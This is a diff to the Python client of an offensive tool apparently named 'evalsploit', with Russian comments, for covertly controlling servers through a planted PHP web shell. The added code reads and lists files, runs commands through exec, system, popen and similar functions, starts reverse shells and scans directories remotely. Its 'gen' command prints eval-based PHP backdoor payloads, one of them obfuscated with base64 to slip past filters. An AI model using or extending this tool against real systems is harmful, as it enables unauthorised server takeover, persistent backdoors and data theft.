@@ -26,7 +26,7 @@ import scan.sbd as sbd
 import exploits.reverse as rs
 import exploits.exploit as x
 
-
+version = "2.5.2"
 config = configparser.ConfigParser()
 zed= config.read('settings.ini')
 shell =config['SETTINGS']['shell']
@@ -34,20 +34,34 @@ read = config['SETTINGS']['read']
 listdir = config['SETTINGS']['ls']
 silent = config['SETTINGS']['silent']
 reverse = config['SETTINGS']['reverse']
+ts = config['SETTINGS']['send']
 
 a=[]
 who = []
 
 
-url = input("URL@evalsploit~: ")
-
 uagent = random.choice(open('useragents').read().splitlines())
-if silent != "1": serverip = send.send(url,"echo $_SERVER['SERVER_ADDR'].\":\".$_SERVER['SERVER_PORT'];",uagent) 
-else: serverip = ""
+
+print("Введите заражённый url для коннекта")
+print("Или оставьте поле пустым, чтобы восстановить прошлую сессию")
+
+test = input("URL@evalsploit~: ")
+
+if test == "": 
+    url = config['SETTINGS']['url']
+else: 
+    config['SETTINGS']['url'] = test
+    with open('settings.ini', 'w') as configfile: config.write(configfile)
+    url = test
+
+os.system('cls')
+
+#Серверинфо (мб не надо, потом доделаю)
+#if silent != "1": serverip = send.send(url,"echo $_SERVER['SERVER_ADDR'].\":\".$_SERVER['SERVER_PORT'];",uagent) 
+#else: serverip = ""
 
 def hi():
-    print(f'''
-				 			   			                      	     
+    print(f'''		   			                      	     
                                   ▄█                   ▄█           █▀   ▄█   	
          ▄▄▄▄  ▄▄▄▄ ▄▄▄▄  ▄▄▄▄    ██   ▄▄▄▄   ▄█ ▄▄▄   ██    ▄▄▄     ▄  ▄██▄  	
        ▄█▀▀▀▀█▌ ▀█▄  █▌  ▀▀ ▄██   ██  ▐██▀▀█▌ ███▀▀██  ██  ▄█▀▀██▄  ██   ██    
@@ -55,10 +69,10 @@ def hi():
         ▀████▀    ▀██    ▀█▄▄██▀  █▀  ▀████▀  █████▀   █▀   ▀███▀   █▀   █▀    
        ▄                                      ██                           ▄ 	
         ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
-        {serverip}
+        {version}
                                                Средство скрытой эксплуатации      
                                                и байпаса отключенных функций
-
+                                               
       
           
     _________________________Локальные настройки клиента_________________________
@@ -69,31 +83,38 @@ def hi():
     Модуль тихого режима: 0,1 (выкл,вкл)  
     Опытные модули:       expect_popen, pcntl_exec 
     Модули reverse-shell: monkey, ivan
-    
+    Модули send:          bypass, classic, simple
+
     _______________________________Активные модули_______________________________
 
     Модуль ls:            {listdir}
     Модуль cat:           {read}
     Модуль run:           {shell}
     Модуль reverse-shell: {reverse}
+    Модуль send:          {ts}
+    Рабочая область:      {url}
       ''')
     
 hi()
 
 if silent != "1":
     execlist = by.cmd(url,uagent)
-    pwd = send.send(url,"echo __DIR__;",uagent) # PWD
-    tatpwd = pwd
-    if execlist != "":
-        print("    Сервер поддерживает:  "+execlist)
-        if shell not in execlist:
-            print("    Сервер не поддерживает "+shell)
-            who = execlist.split(',')
-            shell = random.choice(who)
-            print("    Установлен модуль ", shell)
-            s
+    if execlist == ">":
+        print("    Произошла ошибка. Возможно, не тот модуль send")
+        print("    Или проблема с сервером. Крч я хз, сам решай")
+        print("    Потом фикс выкачу")
     else:
-        print("    Доступных для работы модулей на сервере нет")
+        pwd = send.send(url,"echo __DIR__;",uagent) # PWD
+        statpwd = pwd
+        if execlist not in (""," "):
+            print("    Сервер поддерживает:  "+execlist)
+            if shell not in execlist:
+                print("    Сервер не поддерживает "+shell)
+                who = execlist.split(',')
+                shell = random.choice(who)
+                print("    Установлен модуль ", shell)
+        else:
+            print("    Доступных для работы модулей на сервере нет")
 else:
     pwd = "/var/www/"
     statpwd = pwd
@@ -130,7 +151,6 @@ while True:
             else:
                 pwd = chdr.chdir(url,com,pwd,uagent)
                 
-            
 #============= COPY =============#
         case "cp":
             if com != "":
@@ -150,8 +170,7 @@ while True:
                 if read == "html":
                     cat.file(url,com,pwd,uagent)
                 if read == "base64":
-                    cat.base(url,com,pwd,uagent)
-                    
+                    cat.base(url,com,pwd,uagent)         
 
 #============== PWD ==============#
         case "pwd":
@@ -194,56 +213,55 @@ while True:
         case "ren": #Upload FROM_URL TO DIR
             rn.obj(url,pwd,com,uagent)
 
-        case "run":
-            if shell == "exec":
-                run.exec(url,uagent)
-            if shell == "shell_exec":
-                run.shell_exec(url,uagent)
-            if shell == "system":
-                run.system(url,uagent)
-            if shell == "passthru":
-                run.passthru(url,uagent)
-            if shell == "popen":
-                run.popen(url,uagent)
-            if shell == "proc_open":
-                run.proc_open(url,uagent)  
-            if shell == "expect_popen":
-                run.expect_popen(url,uagent)
-            if shell == "pcntl_exec":
-                run.pcntl_exec(url,uagent)
-            if shell == "do":
-                run.do(url,uagent)
+#=============== EXEC ===============#   
+        case "run": #Какой ужас. Придумать сессию
+            if shell == "exec": run.exec(url,uagent)
+            if shell == "shell_exec": run.shell_exec(url,uagent)
+            if shell == "system": run.system(url,uagent)
+            if shell == "passthru": run.passthru(url,uagent)
+            if shell == "popen": run.popen(url,uagent)
+            if shell == "proc_open": run.proc_open(url,uagent)  
+            if shell == "expect_popen": run.expect_popen(url,uagent)
+            if shell == "pcntl_exec": run.pcntl_exec(url,uagent)
+            if shell == "do": run.do(url,uagent)
 
-        case "set":
-            shell,read,listdir,silent,reverse = settings.sets(com)
+#============= SETTINGS =============#   
+        case "set": #Пофиксить говнокод в модуле
+            shell,read,listdir,silent,reverse,ts = settings.sets(com)
 
-        case "home":
+#=============== HOME ===============#  
+        case "home": #__DIR__
             pwd = send.send(url,"echo __DIR__;",uagent)
 
-        case "scan":
+#=============== SCAN ===============#  
+        case "scan": #Рекурсив по директории
             print("Начат процесс сканирования")
             sbd.sbd(url,com,pwd,uagent)
         
-        case "info":
-            urltext = [] 
+#=============== INFO ===============#  
+        case "info": #Доделать
+            print(send.send(url,"echo php_uname().\"\\n\".PHP_OS.\"\\n\".phpversion();",uagent))
 
-        case "gen":
-            print()
-            print("if(isset($_POST['Z'])){@eval($_POST['Z']);die();}")
-            print()
-
-        case "reverse":
+#========== REVERSE-SHELL ===========#  
+        case "reverse": #Реверс
             print("Стартуем")
-            if reverse == "monkey":
-                rs.shell(url,pwd,com,uagent)
-            if reverse == "ivan":
-                rs.shell2(url,com,uagent)
+            if reverse == "monkey": rs.shell(url,pwd,com,uagent)
+            if reverse == "ivan": rs.shell2(url,com,uagent)
 
-        
+#=============== GEN ===============# 
+        case "gen": #Придумать распознование
+            if ts == "bypass":
+                print('''\nif(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'], '' ,$_POST['Z'])));die();}\n''')
+            if ts in ("classic","simple"):
+                print('''\nif(isset($_POST['Z'])){@eval($_POST['Z']);die();}\n''')
 
-        case "exploit":
+#============= EXPLOIT =============# 
+        case "exploit": #Крутая штука, привинтить к реверсу
             x.steightone(url,com,uagent)
-            
+
+        case "help": hi()
+
+        case "exit": break #выход
 
 
             
